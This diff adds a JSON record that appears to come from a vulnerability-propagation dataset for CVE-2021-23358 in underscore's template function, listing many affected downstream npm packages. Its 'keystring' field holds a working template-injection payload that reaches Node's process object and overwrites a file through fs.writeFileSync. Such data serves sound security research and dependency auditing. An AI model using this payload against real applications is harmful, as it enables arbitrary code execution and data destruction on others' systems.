@@ -1,0 +1,27 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.3.0",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "shred@0.7.0",
+    "expound@0.2.0",
+    "pow-underscore@0.1.0",
+    "mocker@0.1.0",
+    "nexus@0.0.10",
+    "omega@0.9.0",
+    "express-hogan.js@0.1.0",
+    "ql-unit@0.1.0",
+    "ql.io-app@0.4.0-beta",
+    "ql.io-compiler@0.4.0",
+    "ql.io-console@0.4.0",
+    "ql.io-engine@0.4.0",
+    "ql.io-mutable-uri@0.4.0",
+    "rephraser@0.1.6",
+    "ax@0.1.2",
+    "yell@0.0.2",
+    "yell2@0.0.3",
+    "asset_builder@0.2.0"
+  ]
+}
